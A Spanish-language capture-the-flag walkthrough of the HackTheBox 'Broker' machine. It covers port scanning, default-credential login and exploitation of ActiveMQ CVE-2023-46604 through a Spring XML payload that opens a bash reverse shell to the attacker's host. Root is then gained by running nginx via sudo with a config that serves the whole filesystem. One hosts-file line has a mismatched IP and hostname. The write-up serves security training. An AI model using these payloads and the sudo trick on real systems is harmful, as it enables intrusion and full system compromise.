![[Pasted image 20250507190232.png]]


**Publicado:** 07 de Mayo de 2025 
**Autor:** José Miguel Romero aka x3m1Sec 
**Dificultad:** ⭐ Easy

## 📝 Descripción

"Broker" es una máquina Linux de dificultad fácil en la plataforma HackTheBox que simula un entorno empresarial con un servidor de mensajería Apache ActiveMQ expuesto. La máquina destaca la importancia de mantener actualizado el software de infraestructura crítica, ya que el vector de ataque principal aprovecha una vulnerabilidad de deserialización (CVE-2023-46604) en ActiveMQ.

Esta vulnerabilidad permite la ejecución remota de código sin necesidad de autenticación a través del protocolo OpenWire, lo que posibilita a un atacante obtener acceso inicial al sistema como usuario activemq. Posteriormente, la escalada de privilegios aprovecha una mala configuración en los permisos sudo, que permite al usuario ejecutar nginx como root, facilitando la lectura de archivos privilegiados en el sistema.

La máquina es ideal para practicantes que quieran familiarizarse con la explotación de vulnerabilidades en middleware empresarial y técnicas de escalada de privilegios mediante configuraciones mal implementadas.
## 🚀 Metodología

```mermaid
flowchart TD
    A[Inicio] --> B[Reconocimiento]
    B --> C[Escaneo de puertos]
    C --> D{Análisis de servicios}
    D --> E[Puerto 80/8161: HTTP/ActiveMQ Admin]
    D --> F[Puerto 61616: ActiveMQ OpenWire]
    D --> G[Otros servicios: SSH, MQTT, AMQP, STOMP]
    E --> H[Acceso con credenciales por defecto admin:admin]
    H --> I[Descubrimiento versión ActiveMQ 5.15.15]
    I --> J[Búsqueda de exploits]
    J --> K[CVE-2023-46604: Vulnerabilidad deserialización]
    K --> L[Explotación]
    L --> M[Acceso como usuario activemq]
    M --> N[Enumeración local]
    N --> O[Sudo como nginx]
    O --> P[Escalada de privilegios]
    P --> Q[Acceso como root]
    Q --> R[Fin]
```




## 🔭 Reconocimiento

### Ping para verificación en base a TTL

```bash
❯ ping -c2 10.10.11.243                                                   
PING 10.10.11.243 (10.10.11.243) 56(84) bytes of data.
64 bytes from 10.10.11.243: icmp_seq=1 ttl=63 time=47.9 ms
64 bytes from 10.10.11.243: icmp_seq=2 ttl=63 time=48.2 ms

--- 10.10.11.243 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 47.947/48.065/48.184/0.118 ms
```

> 💡 **Nota**: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.

### Escaneo de puertos

```bash

ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.243 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//) 
```

```bash
❯ echo $ports                                          
22,80,1883,5672,8161,45657,61613,61614,61616
```
### Enumeración de servicios

```bash
nmap -sC -sV -p$ports 10.10.11.243 -oN services.txt

Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-07 19:05 CEST
Nmap scan report for 10.10.11.243
Host is up (0.047s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp    open  http       nginx 1.18.0 (Ubuntu)
|_http-title: Error 401 Unauthorized
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
1883/tcp  open  mqtt
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     ActiveMQ/Advisory/Consumer/Topic/#: 
|_    ActiveMQ/Advisory/MasterBroker: 
5672/tcp  open  amqp?
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
8161/tcp  open  http       Jetty 9.4.39.v20210325
|_http-server-header: Jetty(9.4.39.v20210325)
|_http-title: Error 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
45657/tcp open  tcpwrapped
61613/tcp open  stomp      Apache ActiveMQ
| fingerprint-strings: 
|   HELP4STOMP: 
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|_    java.lang.Thread.run(Thread.java:750)
61614/tcp open  http       Jetty 9.4.39.v20210325
|_http-title: Site doesn't have a title.
|_http-server-header: Jetty(9.4.39.v20210325)
| http-methods: 
|_  Potentially risky methods: TRACE
61616/tcp open  apachemq   ActiveMQ OpenWire transport 5.15.15
```

> ⚠️ **Importante**: El servicio HTTP redirige a `searcher.htb`. Debemos agregar este dominio a nuestro archivo hosts.

```bash
echo "10.10.11.208 searcher.htb" | sudo tee -a /etc/hosts
```

---

## 🌐 Enumeración Web

### 80 HTTP

Al intentar acceder al servidor nginx que está ejecutándose en este puerto encontramos encontramos un panel de autenticación autenticación HTTP básica

![[Pasted image 20250507190920.png]]

Al probar con las credenciales básicas `admin:admin`logramos acceder sin mayor problema y observar que se está ejecutado un servicio de colas MQ. 
![[Pasted image 20250507191303.png]]

Accedemos a las opciones de configuración:
![[Pasted image 20250507191443.png]]

Encontramos la versión del servicio que es la 5.15.15, información que ya habíamos logrado enumerar también gracias a banner grabbing de nmap.

Buscando información sobre posibles exploits para esta versión encontramos que hay un  [CVE-2023-46604](https://github.com/advisories/GHSA-crg9-44h2-xw35)

![[Pasted image 20250507192031.png]]

## 💣 Explotación

#### CVE-2023-46604

CVE-2023-46604 es una vulnerabilidad de deserialización que existe en el protocolo OpenWire de Apache ActiveMQ. Este defecto puede ser explotado por un atacante para ejecutar código arbitrario en el servidor donde se ejecuta ActiveMQ. El exploit script de este repositorio automatiza el proceso de enviar una petición crafteada al servidor para activar la vulnerabilidad.

Descargamos el siguiente exploit:

```bash
git clone https://github.com/evkl1d/CVE-2023-46604.git
```

Editamos el archivo poc.xml para especificar en la reverse shell nuestro host y puerto de ataque:
```xml
<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg>
            <list>
                <value>bash</value>
                <value>-c</value>
                <value>bash -i &gt;&amp; /dev/tcp/10.10.14.7/9001 0&gt;&amp;1</value>
            </list>
            </constructor-arg>
        </bean>
    </beans>

```

El exploit necesita ser ejecutado especificando los siguientes argumentos:

```bash
python exploit.py -i <target-ip> -p <target-port> -u <url-to-poc.xml>
```

Necesitamos previamente disponibilizar el payload poc.xml en un servidor web, para ello  levantaremos un servidor web con python:

```bash
python3 -m http.server 80
```

Lanzamos el exploit y ganamos acceso remoto al servidor como usuario activemq:

```bash
 python exploit.py -i 10.10.11.243 -p 61616 -u http://10.10.14.7/poc.xml
```

![[Pasted image 20250507193434.png]]


## 🛠️ Mejora de la Shell

Una vez ingresamos a la máquina, realizamos un spawn de la tty:

```bash
script /dev/null -c bash
```

```bash
ctrl +z
stty raw -echo; fg
reset xterm
```

```bash
echo $TERM
export TERM=xterm
export SHELL=/bin/bash
```

```bash
# Comprobamos el tamaño de la ventana de la terminal en el host de ataque
stty size
30 127
```

```bash
# Establecemos el tamaño en base  a la salida del stty size anterior

stty rows 30 columns 127
```


A continuación Obtenemos la primera flag en el directorio /home/activemq:

```bash
activemq@broker:~$ cat user.txt
cat user.txt
06cb0****************5ce5f86fe
```

## 🔑 Escalada de privilegios

Tras enumerar la máquina y no encontrar nada relevante, verificamos si el usuario activemq puede ejecutar algo como sudo:

```bash
sudo -l
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

Si ejecutamos nginx vemos que falla porque el puerto 80 está ocupado:

![[Pasted image 20250507200310.png]]

Si revisamos la ayuda de este programa vemos que una opción (-c) que permite especificar un archivo de configuración:

![[Pasted image 20250507200443.png]]

### 🎯 Explotación de nginx con sudo

Podemos abusar de esto creando una copia del archivo original de tal forma que podríamos iniciar nginx en otro puerto y con otras configuraciones que definamos:
```bash
cp /etc/nginx/nginx.conf /tmp/
```

Establecemos la siguiente configuración en el fichero, de forma que lo que estamos haciendo es definir una nueva configuración para el usuario root que levante una nueva instancia de nginx en el puerto 1234 habilitando el directory listing:

```bash
user root;

events {
    worker_connections 768;
    # multi_accept on;
}

http {

    server {
    listen    1234;
    root /;
    autoindex on;
    }
}
```


Lanzamos nginx especificando la configuración que hemos creado con el parámetro -c


```bash
sudo /usr/sbin/nginx -c /tmp/nginx.conf
```


De tal forma que si ahora accedemos desde nuestro host de ataque al puerto 1234 del host comprometido podremos realizar directory listing y acceder al directorio /root para capturar la flag:

![[Pasted image 20250507202842.png]]
